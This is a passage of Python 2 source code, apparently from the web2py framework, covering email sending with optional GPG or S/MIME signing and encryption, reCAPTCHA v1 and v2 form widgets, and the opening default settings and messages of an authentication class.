x509 - smime\n            gpg_home : you can set a GNUPGHOME environment variable\n                to specify home of gnupg\n            sign : sign the message (True or False)\n            sign_passphrase  : passphrase for key signing\n            encrypt : encrypt the message (True or False). It defaults to True.\n                         ... x509 only ...\n            x509_sign_keyfile : the signers private key filename or\n                string containing the key. (PEM format)\n            x509_sign_certfile: the signers certificate filename or\n                string containing the cert. (PEM format)\n            x509_sign_chainfile: sets the optional all-in-one file where you\n                can assemble the certificates of Certification\n                Authorities (CA) which form the certificate\n                chain of email certificate. It can be a\n                string containing the certs to. (PEM format)\n            x509_nocerts : if True then no attached certificate in mail\n            x509_crypt_certfiles: the certificates file or strings to encrypt\n                the messages with can be a file name / string or\n                a list of file names / strings (PEM format)\n        Examples:\n            Send plain text message to single address::\n\n                mail.send('you@example.com',\n                          'Message subject',\n                          'Plain text body of the message')\n\n            Send html message to single address::\n\n                mail.send('you@example.com',\n                          'Message subject',\n                          '<html>Plain text body of the message</html>')\n\n            Send text and html message to three addresses (two in cc)::\n\n                mail.send('you@example.com',\n                          'Message subject',\n                          ('Plain text body', '<html>html body</html>'),\n                          cc=['other1@example.com', 'other2@example.com'])\n\n            Send html only message with image attachment available from the\n            message by 'photo' content id::\n\n                mail.send('you@example.com',\n                          'Message subject',\n                          (None, '<html><img src=\"cid:photo\" /></html>'),\n                          Mail.Attachment('/path/to/photo.jpg'\n                                          content_id='photo'))\n\n            Send email with two attachments and no body text::\n\n                mail.send('you@example.com,\n                          'Message subject',\n                          None,\n                          [Mail.Attachment('/path/to/fist.file'),\n                           Mail.Attachment('/path/to/second.file')])\n\n        Returns:\n            True on success, False on failure.\n\n        Before return, method updates two object's fields:\n\n            - self.result: return value of smtplib.SMTP.sendmail() or GAE's\n              mail.send_mail() method\n            - self.error: Exception message or None if above was successful\n        \"\"\"\n\n        # We don't want to use base64 encoding for unicode mail\n        Charset.add_charset('utf-8', Charset.QP, Charset.QP, 'utf-8')\n\n        def encode_header(key):\n            if [c for c in key if 32 > ord(c) or ord(c) > 127]:\n                return Header.Header(key.encode('utf-8'), 'utf-8')\n            else:\n                return key\n\n        # encoded or raw text\n        def encoded_or_raw(text):\n            if raw:\n                text = encode_header(text)\n            return text\n\n        sender = sender or self.settings.sender\n\n        if not isinstance(self.settings.server, str):\n            raise Exception('Server address not specified')\n        if not isinstance(sender, str):\n            raise Exception('Sender address not specified')\n\n        if not raw and attachments:\n            # Use multipart/mixed if there is attachments\n            payload_in = MIMEMultipart.MIMEMultipart('mixed')\n        elif raw:\n            # no encoding configuration for raw messages\n            if not isinstance(message, basestring):\n                message = message.read()\n            if isinstance(message, unicode):\n                text = message.encode('utf-8')\n            elif not encoding == 'utf-8':\n                text = message.decode(encoding).encode('utf-8')\n            else:\n                text = message\n            # No charset passed to avoid transport encoding\n            # NOTE: some unicode encoded strings will produce\n            # unreadable mail contents.\n            payload_in = MIMEText.MIMEText(text)\n        if to:\n            if not isinstance(to, (list, tuple)):\n                to = [to]\n        else:\n            raise Exception('Target receiver address not specified')\n        if cc:\n            if not isinstance(cc, (list, tuple)):\n                cc = [cc]\n        if bcc:\n            if not isinstance(bcc, (list, tuple)):\n                bcc = [bcc]\n        if message is None:\n            text = html = None\n        elif isinstance(message, (list, tuple)):\n            text, html = message\n        elif message.strip().startswith('<html') and \\\n                message.strip().endswith('</html>'):\n            text = self.settings.server == 'gae' and message or None\n            html = message\n        else:\n            text = message\n            html = None\n\n        if (not text is None or not html is None) and (not raw):\n\n            if not text is None:\n                if not isinstance(text, basestring):\n                    text = text.read()\n                if isinstance(text, unicode):\n                    text = text.encode('utf-8')\n                elif not encoding == 'utf-8':\n                    text = text.decode(encoding).encode('utf-8')\n            if not html is None:\n                if not isinstance(html, basestring):\n                    html = html.read()\n                if isinstance(html, unicode):\n                    html = html.encode('utf-8')\n                elif not encoding == 'utf-8':\n                    html = html.decode(encoding).encode('utf-8')\n\n            # Construct mime part only if needed\n            if text is not None and html:\n                # We have text and html we need multipart/alternative\n                attachment = MIMEMultipart.MIMEMultipart('alternative')\n                attachment.attach(MIMEText.MIMEText(text, _charset='utf-8'))\n                attachment.attach(\n                    MIMEText.MIMEText(html, 'html', _charset='utf-8'))\n            elif text is not None:\n                attachment = MIMEText.MIMEText(text, _charset='utf-8')\n            elif html:\n                attachment = \\\n                    MIMEText.MIMEText(html, 'html', _charset='utf-8')\n\n            if attachments:\n                # If there is attachments put text and html into\n                # multipart/mixed\n                payload_in.attach(attachment)\n            else:\n                # No attachments no multipart/mixed\n                payload_in = attachment\n\n        if (attachments is None) or raw:\n            pass\n        elif isinstance(attachments, (list, tuple)):\n            for attachment in attachments:\n                payload_in.attach(attachment)\n        else:\n            payload_in.attach(attachments)\n\n        #######################################################\n        #                      CIPHER                         #\n        #######################################################\n        cipher_type = cipher_type or self.settings.cipher_type\n        sign = sign if sign != None else self.settings.sign\n        sign_passphrase = sign_passphrase or self.settings.sign_passphrase\n        encrypt = encrypt if encrypt != None else self.settings.encrypt\n        #######################################################\n        #                       GPGME                         #\n        #######################################################\n        if cipher_type == 'gpg':\n            if self.settings.gpg_home:\n                # Set GNUPGHOME environment variable to set home of gnupg\n                import os\n                os.environ['GNUPGHOME'] = self.settings.gpg_home\n            if not sign and not encrypt:\n                self.error = \"No sign and no encrypt is set but cipher type to gpg\"\n                return False\n\n            # need a python-pyme package and gpgme lib\n            from pyme import core, errors\n            from pyme.constants.sig import mode\n            ############################################\n            #                   sign                   #\n            ############################################\n            if sign:\n                import string\n                core.check_version(None)\n                pin = string.replace(payload_in.as_string(), '\\n', '\\r\\n')\n                plain = core.Data(pin)\n                sig = core.Data()\n                c = core.Context()\n                c.set_armor(1)\n                c.signers_clear()\n                # search for signing key for From:\n                for sigkey in c.op_keylist_all(sender, 1):\n                    if sigkey.can_sign:\n                        c.signers_add(sigkey)\n                if not c.signers_enum(0):\n                    self.error = 'No key for signing [%s]' % sender\n                    return False\n                c.set_passphrase_cb(lambda x, y, z: sign_passphrase)\n                try:\n                    # make a signature\n                    c.op_sign(plain, sig, mode.DETACH)\n                    sig.seek(0, 0)\n                    # make it part of the email\n                    payload = MIMEMultipart.MIMEMultipart('signed',\n                                                          boundary=None,\n                                                          _subparts=None,\n                                                          **dict(\n                                                          micalg=\"pgp-sha1\",\n                                                          protocol=\"application/pgp-signature\"))\n                    # insert the origin payload\n                    payload.attach(payload_in)\n                    # insert the detached signature\n                    p = MIMEBase.MIMEBase(\"application\", 'pgp-signature')\n                    p.set_payload(sig.read())\n                    payload.attach(p)\n                    # it's just a trick to handle the no encryption case\n                    payload_in = payload\n                except errors.GPGMEError, ex:\n                    self.error = \"GPG error: %s\" % ex.getstring()\n                    return False\n            ############################################\n            #                  encrypt                 #\n            ############################################\n            if encrypt:\n                core.check_version(None)\n                plain = core.Data(payload_in.as_string())\n                cipher = core.Data()\n                c = core.Context()\n                c.set_armor(1)\n                # collect the public keys for encryption\n                recipients = []\n                rec = to[:]\n                if cc:\n                    rec.extend(cc)\n                if bcc:\n                    rec.extend(bcc)\n                for addr in rec:\n                    c.op_keylist_start(addr, 0)\n                    r = c.op_keylist_next()\n                    if r is None:\n                        self.error = 'No key for [%s]' % addr\n                        return False\n                    recipients.append(r)\n                try:\n                    # make the encryption\n                    c.op_encrypt(recipients, 1, plain, cipher)\n                    cipher.seek(0, 0)\n                    # make it a part of the email\n                    payload = MIMEMultipart.MIMEMultipart('encrypted',\n                                                          boundary=None,\n                                                          _subparts=None,\n                                                          **dict(protocol=\"application/pgp-encrypted\"))\n                    p = MIMEBase.MIMEBase(\"application\", 'pgp-encrypted')\n                    p.set_payload(\"Version: 1\\r\\n\")\n                    payload.attach(p)\n                    p = MIMEBase.MIMEBase(\"application\", 'octet-stream')\n                    p.set_payload(cipher.read())\n                    payload.attach(p)\n                except errors.GPGMEError, ex:\n                    self.error = \"GPG error: %s\" % ex.getstring()\n                    return False\n        #######################################################\n        #                       X.509                         #\n        #######################################################\n        elif cipher_type == 'x509':\n            if not sign and not encrypt:\n                self.error = \"No sign and no encrypt is set but cipher type to x509\"\n                return False\n            import os\n            x509_sign_keyfile = x509_sign_keyfile or\\\n                                      self.settings.x509_sign_keyfile\n\n            x509_sign_chainfile = x509_sign_chainfile or\\\n                                      self.settings.x509_sign_chainfile\n\n            x509_sign_certfile = x509_sign_certfile or\\\n                                      self.settings.x509_sign_certfile or\\\n                                      x509_sign_keyfile or\\\n                                      self.settings.x509_sign_certfile\n\n            # crypt certfiles could be a string or a list\n            x509_crypt_certfiles = x509_crypt_certfiles or\\\n                                      self.settings.x509_crypt_certfiles\n\n            x509_nocerts = x509_nocerts or\\\n                                      self.settings.x509_nocerts\n\n            # need m2crypto\n            try:\n                from M2Crypto import BIO, SMIME, X509\n            except Exception, e:\n                self.error = \"Can't load M2Crypto module\"\n                return False\n            msg_bio = BIO.MemoryBuffer(payload_in.as_string())\n            s = SMIME.SMIME()\n\n            # SIGN\n            if sign:\n                # key for signing\n                try:\n                    keyfile_bio = BIO.openfile(x509_sign_keyfile)\\\n                        if os.path.isfile(x509_sign_keyfile)\\\n                        else BIO.MemoryBuffer(x509_sign_keyfile)\n                    sign_certfile_bio = BIO.openfile(x509_sign_certfile)\\\n                        if os.path.isfile(x509_sign_certfile)\\\n                        else BIO.MemoryBuffer(x509_sign_certfile)\n                    s.load_key_bio(keyfile_bio, sign_certfile_bio,\n                                   callback=lambda x: sign_passphrase)\n                    if x509_sign_chainfile:\n                        sk = X509.X509_Stack()\n                        chain = X509.load_cert(x509_sign_chainfile)\\\n                            if os.path.isfile(x509_sign_chainfile)\\\n                            else X509.load_cert_string(x509_sign_chainfile)\n                        sk.push(chain)\n                        s.set_x509_stack(sk)\n                except Exception, e:\n                    self.error = \"Something went wrong on certificate / private key loading: <%s>\" % str(e)\n                    return False\n                try:\n                    if x509_nocerts:\n                        flags = SMIME.PKCS7_NOCERTS\n                    else:\n                        flags = 0\n                    if not encrypt:\n                        flags += SMIME.PKCS7_DETACHED\n                    p7 = s.sign(msg_bio, flags=flags)\n                    msg_bio = BIO.MemoryBuffer(payload_in.as_string(\n                    ))  # Recreate coz sign() has consumed it.\n                except Exception, e:\n                    self.error = \"Something went wrong on signing: <%s> %s\" % (\n                        str(e), str(flags))\n                    return False\n\n            # ENCRYPT\n            if encrypt:\n                try:\n                    sk = X509.X509_Stack()\n                    if not isinstance(x509_crypt_certfiles, (list, tuple)):\n                        x509_crypt_certfiles = [x509_crypt_certfiles]\n\n                    # make an encryption cert's stack\n                    for crypt_certfile in x509_crypt_certfiles:\n                        certfile = X509.load_cert(crypt_certfile)\\\n                             if os.path.isfile(crypt_certfile)\\\n                             else X509.load_cert_string(crypt_certfile)\n                        sk.push(certfile)\n                    s.set_x509_stack(sk)\n\n                    s.set_cipher(SMIME.Cipher('des_ede3_cbc'))\n                    tmp_bio = BIO.MemoryBuffer()\n                    if sign:\n                        s.write(tmp_bio, p7)\n                    else:\n                        tmp_bio.write(payload_in.as_string())\n                    p7 = s.encrypt(tmp_bio)\n                except Exception, e:\n                    self.error = \"Something went wrong on encrypting: <%s>\" % str(e)\n                    return False\n\n            # Final stage in sign and encryption\n            out = BIO.MemoryBuffer()\n            if encrypt:\n                s.write(out, p7)\n            else:\n                if sign:\n                    s.write(out, p7, msg_bio, SMIME.PKCS7_DETACHED)\n                else:\n                    out.write('\\r\\n')\n                    out.write(payload_in.as_string())\n            out.close()\n            st = str(out.read())\n            payload = message_from_string(st)\n        else:\n            # no cryptography process as usual\n            payload = payload_in\n\n        if from_address:\n            payload['From'] = encoded_or_raw(from_address.decode(encoding))\n        else:\n            payload['From'] = encoded_or_raw(sender.decode(encoding))\n        origTo = to[:]\n        if to:\n            payload['To'] = encoded_or_raw(', '.join(to).decode(encoding))\n        if reply_to:\n            payload['Reply-To'] = encoded_or_raw(reply_to.decode(encoding))\n        if cc:\n            payload['Cc'] = encoded_or_raw(', '.join(cc).decode(encoding))\n            to.extend(cc)\n        if bcc:\n            to.extend(bcc)\n        payload['Subject'] = encoded_or_raw(subject.decode(encoding))\n        payload['Date'] = email.utils.formatdate()\n        for k, v in headers.iteritems():\n            payload[k] = encoded_or_raw(v.decode(encoding))\n        result = {}\n        try:\n            if self.settings.server == 'logging':\n                logger.warn('email not sent\\n%s\\nFrom: %s\\nTo: %s\\nSubject: %s\\n\\n%s\\n%s\\n' %\n                            ('-' * 40, sender,\n                                ', '.join(to), subject,\n                                text or html, '-' * 40))\n            elif self.settings.server == 'gae':\n                xcc = dict()\n                if cc:\n                    xcc['cc'] = cc\n                if bcc:\n                    xcc['bcc'] = bcc\n                if reply_to:\n                    xcc['reply_to'] = reply_to\n                from google.appengine.api import mail\n                attachments = attachments and [mail.Attachment(\n                        a.my_filename,\n                        a.my_payload,\n                        contebt_id='<attachment-%s>' % k\n                        ) for k,a in enumerate(attachments) if not raw]\n                if attachments:\n                    result = mail.send_mail(\n                        sender=sender, to=origTo,\n                        subject=unicode(subject), body=unicode(text), html=html,\n                        attachments=attachments, **xcc)\n                elif html and (not raw):\n                    result = mail.send_mail(\n                        sender=sender, to=origTo,\n                        subject=unicode(subject), body=unicode(text), html=html, **xcc)\n                else:\n                    result = mail.send_mail(\n                        sender=sender, to=origTo,\n                        subject=unicode(subject), body=unicode(text), **xcc)\n            else:\n                smtp_args = self.settings.server.split(':')\n                kwargs = dict(timeout=self.settings.timeout)\n                if self.settings.ssl:\n                    server = smtplib.SMTP_SSL(*smtp_args, **kwargs)\n                else:\n                    server = smtplib.SMTP(*smtp_args, **kwargs)\n                if self.settings.tls and not self.settings.ssl:\n                    server.ehlo(self.settings.hostname)\n                    server.starttls()\n                    server.ehlo(self.settings.hostname)\n                if self.settings.login:\n                    server.login(*self.settings.login.split(':', 1))\n                result = server.sendmail(\n                    sender, to, payload.as_string())\n                server.quit()\n        except Exception, e:\n            logger.warn('Mail.send failure:%s' % e)\n            self.result = result\n            self.error = e\n            return False\n        self.result = result\n        self.error = None\n        return True\n\n\nclass Recaptcha(DIV):\n\n    \"\"\"\n    Examples:\n        Use as::\n\n            form = FORM(Recaptcha(public_key='...',private_key='...'))\n\n        or::\n\n            form = SQLFORM(...)\n            form.append(Recaptcha(public_key='...',private_key='...'))\n\n    \"\"\"\n\n    API_SSL_SERVER = 'https://www.google.com/recaptcha/api'\n    API_SERVER = 'http://www.google.com/recaptcha/api'\n    VERIFY_SERVER = 'http://www.google.com/recaptcha/api/verify'\n\n    def __init__(self,\n                 request=None,\n                 public_key='',\n                 private_key='',\n                 use_ssl=False,\n                 error=None,\n                 error_message='invalid',\n                 label='Verify:',\n                 options='',\n                 comment='',\n                 ajax=False\n    ):\n        request = request or current.request\n        self.request_vars = request and request.vars or current.request.vars\n        self.remote_addr = request.env.remote_addr\n        self.public_key = public_key\n        self.private_key = private_key\n        self.use_ssl = use_ssl\n        self.error = error\n        self.errors = Storage()\n        self.error_message = error_message\n        self.components = []\n        self.attributes = {}\n        self.label = label\n        self.options = options\n        self.comment = comment\n        self.ajax = ajax\n\n    def _validate(self):\n\n        # for local testing:\n\n        recaptcha_challenge_field = \\\n            self.request_vars.recaptcha_challenge_field\n        recaptcha_response_field = \\\n            self.request_vars.recaptcha_response_field\n        private_key = self.private_key\n        remoteip = self.remote_addr\n        if not (recaptcha_response_field and recaptcha_challenge_field\n                and len(recaptcha_response_field)\n                and len(recaptcha_challenge_field)):\n            self.errors['captcha'] = self.error_message\n            return False\n        params = urllib.urlencode({\n            'privatekey': private_key,\n            'remoteip': remoteip,\n            'challenge': recaptcha_challenge_field,\n            'response': recaptcha_response_field,\n        })\n        request = urllib2.Request(\n            url=self.VERIFY_SERVER,\n            data=params,\n            headers={'Content-type': 'application/x-www-form-urlencoded',\n                     'User-agent': 'reCAPTCHA Python'})\n        httpresp = urllib2.urlopen(request)\n        return_values = httpresp.read().splitlines()\n        httpresp.close()\n        return_code = return_values[0]\n        if return_code == 'true':\n            del self.request_vars.recaptcha_challenge_field\n            del self.request_vars.recaptcha_response_field\n            self.request_vars.captcha = ''\n            return True\n        else:\n            # In case we get an error code, store it so we can get an error message\n            # from the /api/challenge URL as described in the reCAPTCHA api docs.\n            self.error = return_values[1]\n            self.errors['captcha'] = self.error_message\n            return False\n\n    def xml(self):\n        public_key = self.public_key\n        use_ssl = self.use_ssl\n        error_param = ''\n        if self.error:\n            error_param = '&error=%s' % self.error\n        if use_ssl:\n            server = self.API_SSL_SERVER\n        else:\n            server = self.API_SERVER\n        if not self.ajax:\n            captcha = DIV(\n                SCRIPT(\"var RecaptchaOptions = {%s};\" % self.options),\n                SCRIPT(_type=\"text/javascript\",\n                       _src=\"%s/challenge?k=%s%s\" % (server, public_key, error_param)),\n                TAG.noscript(\n                    IFRAME(\n                        _src=\"%s/noscript?k=%s%s\" % (\n                            server, public_key, error_param),\n                        _height=\"300\", _width=\"500\", _frameborder=\"0\"), BR(),\n                    INPUT(\n                        _type='hidden', _name='recaptcha_response_field',\n                        _value='manual_challenge')), _id='recaptcha')\n\n        else: #use Google's ajax interface, needed for LOADed components\n\n            url_recaptcha_js = \"%s/js/recaptcha_ajax.js\" % server\n            RecaptchaOptions = \"var RecaptchaOptions = {%s}\" % self.options\n            script = \"\"\"%(options)s;\n            jQuery.getScript('%(url)s',function() {\n                Recaptcha.create('%(public_key)s',\n                    'recaptcha',jQuery.extend(RecaptchaOptions,{'callback':Recaptcha.focus_response_field}))\n                }) \"\"\" % ({'options': RecaptchaOptions, 'url': url_recaptcha_js, 'public_key': public_key})\n            captcha = DIV(\n                SCRIPT(\n                    script,\n                    _type=\"text/javascript\",\n                ),\n                TAG.noscript(\n                    IFRAME(\n                        _src=\"%s/noscript?k=%s%s\" % (\n                            server, public_key, error_param),\n                        _height=\"300\", _width=\"500\", _frameborder=\"0\"), BR(),\n                    INPUT(\n                        _type='hidden', _name='recaptcha_response_field',\n                        _value='manual_challenge')), _id='recaptcha')\n\n        if not self.errors.captcha:\n            return XML(captcha).xml()\n        else:\n            captcha.append(DIV(self.errors['captcha'], _class='error'))\n            return XML(captcha).xml()\n\n\nclass Recaptcha2(DIV):\n    \"\"\"\n    Experimental:\n    Creates a DIV holding the newer Recaptcha from Google (v2)\n\n    Args:\n        request : the request. If not passed, uses current request\n        public_key : the public key Google gave you\n        private_key : the private key Google gave you\n        error_message : the error message to show if verification fails\n        label : the label to use\n        options (dict) : takes these parameters\n\n            - hl\n            - theme\n            - type\n            - tabindex\n            - callback\n            - expired-callback\n\n            see https://developers.google.com/recaptcha/docs/display for docs about those\n\n        comment : the comment\n\n    Examples:\n        Use as::\n\n            form = FORM(Recaptcha2(public_key='...',private_key='...'))\n\n        or::\n\n            form = SQLFORM(...)\n            form.append(Recaptcha2(public_key='...',private_key='...'))\n\n        to protect the login page instead, use::\n\n            from gluon.tools import Recaptcha2\n            auth.settings.captcha = Recaptcha2(request, public_key='...',private_key='...')\n\n    \"\"\"\n\n    API_URI = 'https://www.google.com/recaptcha/api.js'\n    VERIFY_SERVER = 'https://www.google.com/recaptcha/api/siteverify'\n\n    def __init__(self,\n                 request=None,\n                 public_key='',\n                 private_key='',\n                 error_message='invalid',\n                 label='Verify:',\n                 options=None,\n                 comment='',\n                 ):\n        request = request or current.request\n        self.request_vars = request and request.vars or current.request.vars\n        self.remote_addr = request.env.remote_addr\n        self.public_key = public_key\n        self.private_key = private_key\n        self.errors = Storage()\n        self.error_message = error_message\n        self.components = []\n        self.attributes = {}\n        self.label = label\n        self.options = options or {}\n        self.comment = comment\n\n    def _validate(self):\n        recaptcha_response_field = self.request_vars.pop('g-recaptcha-response', None)\n        remoteip = self.remote_addr\n        if not recaptcha_response_field:\n            self.errors['captcha'] = self.error_message\n            return False\n        params = urllib.urlencode({\n            'secret': self.private_key,\n            'remoteip': remoteip,\n            'response': recaptcha_response_field,\n        })\n        request = urllib2.Request(\n            url=self.VERIFY_SERVER,\n            data=params,\n            headers={'Content-type': 'application/x-www-form-urlencoded',\n                     'User-agent': 'reCAPTCHA Python'})\n        httpresp = urllib2.urlopen(request)\n        content = httpresp.read()\n        httpresp.close()\n        try:\n            response_dict = json_parser.loads(content)\n        except:\n            self.errors['captcha'] = self.error_message\n            return False\n        if response_dict.get('success', False):\n            self.request_vars.captcha = ''\n            return True\n        else:\n            self.errors['captcha'] = self.error_message\n            return False\n\n    def xml(self):\n        api_uri = self.API_URI\n        hl = self.options.pop('hl', None)\n        if hl:\n            api_uri = self.API_URI + '?hl=%s' % hl\n        public_key = self.public_key\n        self.options['sitekey'] = public_key\n        captcha = DIV(\n            SCRIPT(_src=api_uri, _async='', _defer=''),\n            DIV(_class=\"g-recaptcha\", data=self.options),\n            TAG.noscript(XML(\"\"\"\n<div style=\"width: 302px; height: 352px;\">\n<div style=\"width: 302px; height: 352px; position: relative;\">\n  <div style=\"width: 302px; height: 352px; position: absolute;\">\n    <iframe src=\"https://www.google.com/recaptcha/api/fallback?k=%(public_key)s\"\n            frameborder=\"0\" scrolling=\"no\"\n            style=\"width: 302px; height:352px; border-style: none;\">\n    </iframe>\n  </div>\n  <div style=\"width: 250px; height: 80px; position: absolute; border-style: none;\n              bottom: 21px; left: 25px; margin: 0px; padding: 0px; right: 25px;\">\n    <textarea id=\"g-recaptcha-response\" name=\"g-recaptcha-response\"\n              class=\"g-recaptcha-response\"\n              style=\"width: 250px; height: 80px; border: 1px solid #c1c1c1;\n                     margin: 0px; padding: 0px; resize: none;\" value=\"\">\n    </textarea>\n  </div>\n</div>\n</div>\"\"\" % dict(public_key=public_key))\n            )\n        )\n        if not self.errors.captcha:\n            return XML(captcha).xml()\n        else:\n            captcha.append(DIV(self.errors['captcha'], _class='error'))\n            return XML(captcha).xml()\n\n\n# this should only be used for captcha and perhaps not even for that\ndef addrow(form, a, b, c, style, _id, position=-1):\n    if style == \"divs\":\n        form[0].insert(position, DIV(DIV(LABEL(a), _class='w2p_fl'),\n                                     DIV(b, _class='w2p_fw'),\n                                     DIV(c, _class='w2p_fc'),\n                                     _id=_id))\n    elif style == \"table2cols\":\n        form[0].insert(position, TR(TD(LABEL(a), _class='w2p_fl'),\n                                    TD(c, _class='w2p_fc')))\n        form[0].insert(position + 1, TR(TD(b, _class='w2p_fw'),\n                                        _colspan=2, _id=_id))\n    elif style == \"ul\":\n        form[0].insert(position, LI(DIV(LABEL(a), _class='w2p_fl'),\n                                    DIV(b, _class='w2p_fw'),\n                                    DIV(c, _class='w2p_fc'),\n                                    _id=_id))\n    elif style == \"bootstrap\":\n        form[0].insert(position, DIV(LABEL(a, _class='control-label'),\n                                     DIV(b, SPAN(c, _class='inline-help'),\n                                         _class='controls'),\n                                     _class='control-group', _id=_id))\n    elif style == \"bootstrap3_inline\":\n        form[0].insert(position, DIV(LABEL(a, _class='control-label col-sm-3'),\n                                     DIV(b, SPAN(c, _class='help-block'),\n                                         _class='col-sm-9'),\n                                     _class='form-group', _id=_id))\n    elif style == \"bootstrap3_stacked\":\n        form[0].insert(position, DIV(LABEL(a, _class='control-label'),\n                                     b, SPAN(c, _class='help-block'),\n                                     _class='form-group', _id=_id))\n    else:\n        form[0].insert(position, TR(TD(LABEL(a), _class='w2p_fl'),\n                                    TD(b, _class='w2p_fw'),\n                                    TD(c, _class='w2p_fc'), _id=_id))\n\n\nclass Auth(object):\n\n    default_settings = dict(\n        hideerror=False,\n        password_min_length=4,\n        cas_maps=None,\n        reset_password_requires_verification=False,\n        registration_requires_verification=False,\n        registration_requires_approval=False,\n        bulk_register_enabled=False,\n        login_after_registration=False,\n        login_after_password_change=True,\n        alternate_requires_registration=False,\n        create_user_groups=\"user_%(id)s\",\n        everybody_group_id=None,\n        manager_actions={},\n        auth_manager_role=None,\n        two_factor_authentication_group = None,\n        login_captcha=None,\n        register_captcha=None,\n        pre_registration_div=None,\n        retrieve_username_captcha=None,\n        retrieve_password_captcha=None,\n        captcha=None,\n        prevent_open_redirect_attacks=True,\n        prevent_password_reset_attacks=True,\n        expiration=3600,            # one hour\n        long_expiration=3600 * 30 * 24,  # one month\n        remember_me_form=True,\n        allow_basic_login=False,\n        allow_basic_login_only=False,\n        on_failed_authentication=lambda x: redirect(x),\n        formstyle=None,\n        label_separator=None,\n        logging_enabled = True,\n        allow_delete_accounts=False,\n        password_field='password',\n        table_user_name='auth_user',\n        table_group_name='auth_group',\n        table_membership_name='auth_membership',\n        table_permission_name='auth_permission',\n        table_event_name='auth_event',\n        table_cas_name='auth_cas',\n        table_token_name='auth_token',\n        table_user=None,\n        table_group=None,\n        table_membership=None,\n        table_permission=None,\n        table_event=None,\n        table_cas=None,\n        showid=False,\n        use_username=False,\n        login_email_validate=True,\n        login_userfield=None,\n        multi_login=False,\n        logout_onlogout=None,\n        register_fields=None,\n        register_verify_password=True,\n        profile_fields=None,\n        email_case_sensitive=True,\n        username_case_sensitive=True,\n        update_fields=['email'],\n        ondelete=\"CASCADE\",\n        client_side=True,\n        renew_session_onlogin=True,\n        renew_session_onlogout=True,\n        keep_session_onlogin=True,\n        keep_session_onlogout=False,\n        wiki=Settings(),\n    )\n        # ## these are messages that can be customized\n    default_messages = dict(\n        login_button='Log In',\n        register_button='Sign Up',\n        password_reset_button='Request reset password',\n        password_change_button='Change password',\n        profile_save_button='Apply changes',\n        submit_button='Submit',\n        verify_password='Verify Password',\n        delete_label='Check to delete',\n        function_disabled='Function disabled',\n        access_denied='Insufficient privileges',\n        registration_verifying='Registration needs verification',\n        registration_pending='Registration is pending approval',\n        email_taken='This email already has an account',\n        invalid_username='Invalid username',\n        username_taken='Username already taken',\n        login_disabled='Login disabled by administrator',\n        logged_in='Logged in',\n        email_sent='Email sent',\n        unable_to_send_email='Unable to send email',\n        email_verified='Email verified',\n        logged_out='Logged out',\n        registration_successful='Registration successful',\n        invalid_email='Invalid email',\n        unable_send_email='Unable to send email',\n        invalid_login='Invalid login',\n        invalid_user='Invalid user',\n        invalid_password='Invalid password',\n        is_empty=\"Cannot be empty\",\n        mismatched_password=\"Password fields don't match\",\n        verify_email='Welcome %(username)s! Click on the link %(link)s to verify your email',\n        verify_email_subject='Email verification',\n        username_sent='Your username was emailed to you',\n        new_password_sent='A new password was emailed to you',\n        password_changed='Password changed',\n        retrieve_username='Your username is: %(username)s',\n        retrieve_username_subject='Username retrieve',\n        retrieve_password='Your password is: %(password)s',\n        retrieve_password_subject='Password retrieve',\n        reset_password='Click on the link %(link)s to reset your password',\n        reset_password_subject='Password reset',\n        bulk_invite_subject='Invitation to join%(site)s',\n        bulk_invite_body='You have been invited to join %(site)s, click %(link)s to complete the process',\n        invalid_reset_password='Invalid reset password',\n        profile_updated='Profile updated',\n        new_password='New password',\n        old_password='Old password',\n        group_description='Group uniquely assigned to user %(id)s',\n        register_log='User %(id)s Registered',\n        login_log='User %(id)s Logged-in',\n        login_failed_log=None,\n        logout_log='User %(id)s Logged-out',\n        profile_log='User %(id)s Profile updated',\n        verify_email_log='User %(id)s Verification email sent',\n        retrieve_username_log='User %(id)s Username retrieved',\n        retrieve_password_log='User %(id)s Password retrieved',\n        reset_password_log='User %(id)s Password reset',\n        change_password_log='User %(id)s Password changed',\n        add_group_log='Group %(group_id)s created',\n        del_group_log='Group %(group_id)s deleted',\n        add_membership_log=None,\n        del_membership_log=None,\n        has_membership_log=None,\n        add_permission_log=None,\n        del_permission_log=None,\n        has_permission_log=None,\n        impersonate_log='User %(id)s is impersonating %(other_id)s',\n        label_first_name='First name',\n        label_last_name='Last name',\n        label_username='Username',\n        label_email='E-mail',\n        label_password='Password',\n        label_registration_key='Registration key',\n        label_reset_password_key='Reset Password key',\n        label_registration_id='Registration identifier',\n        label_role='Role',\n        label_description='Description',\n        label_user_id='User ID',\n        label_group_id='Group ID',\n        label_name='Name',\n        label_table_name='Object or table name',\n        label_record_id='Record ID',\n        label_time_stamp='Timestamp',\n        label_client_ip='Client IP',\n        label_origin='Origin',\n        label_remember_me=\"Remember me (for 30 days)\",\n        verify_password_comment='please input your password again',\n    )\n\n    \"\"\"\n    Class for authentication, authorization, role based access control.\n\n    Includes:\n\n    - registration and profile\n    - login and logout\n    - username and password retrieval\n    - event logging\n    - role creation and assignment\n    - user defined group/role based permission\n\n    Args:\n\n        environment: is there for legacy but unused (awful)\n        db: has to be the database where to create tables for authentication\n        mailer: `Mail(...)` or None (no mailer) or True (make a mailer)\n        hmac_key: can be a hmac_key or hmac_key=Auth.get_or_create_key()\n        controller: (where is the user action?)\n        cas_provider: (delegate authentication to the URL, CAS2)\n\n    Authentication Example::\n\n        from gluon.contrib.utils import *\n        mail=Mail()\n        mail.settings.server='smtp.gmail.com:587'\n        mail.settings.sender='you@somewhere.com'\n        mail.settings.login='username:password'\n        auth=Auth(db)\n        auth.settings.mailer=mail\n        # auth.settings....=...\n        auth.define_tables()\n        def authentication():\n            return dict(form=auth())\n\n    Exposes:\n\n    - `http://.../{application}/{controller}/authentication/login`\n    - `http://.../{application}/{controller}/authentication/logout`\n    - `http://.../{application}/{controller}/authentication/register`\n    - `http://.../{application}/{controller}/authentication/verify_email`\n    - `http://.../{application}/{controller}/authentication/retrieve_username`\n    - `http://.../{application}/{controller}/authentication/retrieve_password`\n    - `http://.../{application}/{controller}/authentication/reset_password`\n    - `http://.../{application}/{controller}/authentication/profile`\n    - `http://.../{application}/{controller}/authentication/change_password`\n\n    On registration a group with role=new_user.id is created\n    and user is given membership of this group.\n\n    You can create a group with::\n\n        group_id=auth.add_group('Manager', 'can access the manage action')\n        auth.add_permission(group_id, 'access to manage')\n\n    Here \"access to manage\" is just a user defined string.\n    You can give access to a user::\n\n        auth.add_membership(group_id, user_id)\n\n    If user id is omitted, the logged in user is assumed\n\n    Then you can decorate any action::\n\n        @auth.requires_permission('access to manage')\n        def manage():\n            return dict()\n\n    You can restrict a permission to a specific 